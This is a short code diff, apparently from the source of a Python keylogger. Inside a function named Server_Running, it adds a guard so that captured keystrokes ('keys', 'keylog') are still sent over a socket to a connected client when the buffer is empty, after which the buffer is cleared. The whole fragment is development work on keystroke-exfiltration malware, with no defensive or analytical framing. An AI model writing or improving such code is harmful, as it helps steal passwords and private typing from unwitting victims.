@@ -159,6 +159,7 @@ def Server_Running():
                     return keylog[0:]
 
                 data = write(keys)
+                if data == "": data = " "
                 client.sendall(bytes(data,"utf8"))
                 check = client.recv(1024).decode("utf8")
                 keys.clear()
